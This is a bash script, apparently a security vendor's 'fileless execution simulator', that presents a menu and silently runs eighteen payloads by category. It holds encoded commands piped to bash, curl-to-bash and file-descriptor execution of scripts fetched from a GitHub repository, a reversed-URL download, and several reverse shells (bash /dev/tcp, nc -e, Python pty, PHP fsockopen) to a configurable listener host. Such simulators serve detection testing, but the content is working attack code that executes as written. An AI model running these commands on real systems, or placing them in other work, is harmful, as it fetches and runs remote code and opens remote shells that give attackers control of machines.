#!/usr/bin/env bash
#
# fileless-menu.sh – Upwind fileless-execution simulator (silent edition)
# ------------------------------------------------------------
# 1-4  run every payload in the chosen category (errors ignored)
# 5    runs ALL payloads (errors ignored)
# Output from payloads is completely suppressed.
# ------------------------------------------------------------

set -uo pipefail          # only nounset + pipefail; no -e (errexit)

# ── Colours ───────────────────────────────────────────────────
RESET=$'\e[0m'; BOLD=$'\e[1m'; DIM=$'\e[2m'
BLU=$'\e[1;34m'; CYN=$'\e[1;36m'
GRN=$'\e[1;32m'; YEL=$'\e[1;33m'
RED=$'\e[1;31m'; MAG=$'\e[1;35m'

declare -A CAT_COL=(
  [Encoding]="$YEL"
  [Downloaders]="$GRN"
  [ReverseShells]="$RED"
  [AdvancedFD]="$MAG"
)

# ── Payload blocks (Encoding #5 already fixed) ────────────────
declare -A categories
categories[Encoding]='
# 5
echo "ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
# 6
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)"
# 7
bash -c "$(echo MJAbolOVnD== | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"
# 8
exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
'

categories[Downloaders]='
# 1
curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh | bash
# 2
exec 3< <(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh); bash /proc/self/fd/3
# 3
X=$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py); python3 -c "$X"
# 4
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)"
'

categories[ReverseShells]='
# 9
timeout 2s bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1" &
#10
timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &
#11
timeout 2s python3 -c "import os,pty,socket,sys; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")" &
#12
timeout 2s php -r "\$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");" &
#13
timeout 2s bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1" &
'

categories[AdvancedFD]='
#14
exec 3< <(echo "hs.doaolyp/moc.dab//:ptth" | rev | xargs curl -s); bash /proc/self/fd/3
#15
exec 3< /bin/bash; /proc/self/fd/3 -c "echo executed FD shell"
#16
exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&$FD; cat <&$FD &
#17
exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
#18
python3 - <<'PY'
import urllib.request, sys
exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py").read().decode())
PY
'

# ── Defaults + prompt (once) for reverse-shell vars ───────────
LHOST=${LHOST:-127.0.0.1}
LPORT1=${LPORT1:-4441}
LPORT2=${LPORT2:-4442}
LPORT3=${LPORT3:-4443}

ask_net_vars() {
  echo -e "${DIM}(reverse shell vars – blank = keep default)${RESET}"
  read -rp "  LHOST  [${LHOST}]: " t && [[ $t ]] && LHOST=$t
  read -rp "  LPORT1 [${LPORT1}]: " t && [[ $t ]] && LPORT1=$t
  read -rp "  LPORT2 [${LPORT2}]: " t && [[ $t ]] && LPORT2=$t
  read -rp "  LPORT3 [${LPORT3}]: " t && [[ $t ]] && LPORT3=$t
}

# ── Silent execution helpers ─────────────────────────────────
run_block() {                  # arg = block
  local block="$1" n=0
  while IFS= read -r line; do
    [[ $line =~ ^#\  ]] && { n="${line//[^0-9]/}"; continue; }
    [[ $line ]] || continue
    printf "%b▶  #%d  %s%b\n" "$DIM" "$n" "${1%%$'\n'*}" "$RESET"
    # run command silently; ignore errors
    eval "$line" >/dev/null 2>&1 || true
  done <<< "$block"
}

execute_category() {           # arg = category name
  [[ $1 == ReverseShells ]] && ask_net_vars
  run_block "${categories[$1]}"
}

execute_all() {
  for c in Encoding Downloaders ReverseShells AdvancedFD; do
    printf "\n%b=== %s ===%b\n" "${CAT_COL[$c]}" "$c" "$RESET"
    execute_category "$c"
  done
}

# ── UI helpers ───────────────────────────────────────────────
draw_banner() {
  clear
  if command -v figlet >/dev/null; then
    figlet -f slant Upwind 2>/dev/null | sed "s/^/${MAG}/;s/$/${RESET}/"
  else
    echo -e "${MAG}${BOLD}*** Upwind ***${RESET}"
  fi
  echo -e "${CYN}fileless execution simulation by Lior Boehm${RESET}\n"
}

draw_menu() {
  echo -e "${BOLD}== Choose an option ==${RESET}"
  printf "%s1%s) Encoding\n"        "$BLU" "$RESET"
  printf "%s2%s) Downloaders\n"     "$BLU" "$RESET"
  printf "%s3%s) ReverseShells\n"   "$BLU" "$RESET"
  printf "%s4%s) AdvancedFD\n"      "$BLU" "$RESET"
  printf "%s5%s) ALL PAYLOADS\n"    "$BLU" "$RESET"
  printf "%sq%s) Quit\n"            "$BLU" "$RESET"
}

# ── Main loop ────────────────────────────────────────────────
while true; do
  draw_banner
  draw_menu
  read -rp $'\nOption: ' opt || exit
  case $opt in
    1) execute_category Encoding;;
    2) execute_category Downloaders;;
    3) execute_category ReverseShells;;
    4) execute_category AdvancedFD;;
    5) execute_all;;
    [Qq]) exit 0;;
    *) echo "Invalid option"; sleep 1;;
  esac
  echo -e "\n${GRN}✓ Done – press Enter for menu…${RESET}"
  read -r
done
